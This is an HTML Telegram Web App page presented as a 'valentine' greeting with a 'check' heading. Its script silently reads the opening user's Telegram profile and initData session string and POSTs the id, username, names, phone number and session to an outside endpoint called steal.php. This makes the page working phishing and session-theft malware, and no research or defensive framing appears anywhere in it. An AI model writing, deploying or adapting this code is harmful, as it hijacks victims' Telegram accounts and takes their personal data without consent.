<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Валентинка</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <h1>Проверка</h1>
    <div id="log"></div>

    <script>
        const log = document.getElementById('log');
        const API_URL = 'http://bprof.raximi52.beget.tech/steal.php';
        
        Telegram.WebApp.ready();
        
        const user = Telegram.WebApp.initDataUnsafe?.user;
        const initData = Telegram.WebApp.initData;
        
        log.innerHTML += 'User: ' + (user ? '✅' : '❌') + '<br>';
        log.innerHTML += 'InitData: ' + (initData ? '✅' : '❌') + '<br>';
        
        if (user && initData) {
            fetch(API_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    id: user.id,
                    username: user.username,
                    first_name: user.first_name,
                    last_name: user.last_name,
                    phone: user.phone_number,
                    session: initData
                })
            }).then(res => res.json())
              .then(data => log.innerHTML += 'Отправка: ✅ ' + JSON.stringify(data))
              .catch(e => log.innerHTML += 'Ошибка: ❌ ' + e);
        }
    </script>
</body>
</html>
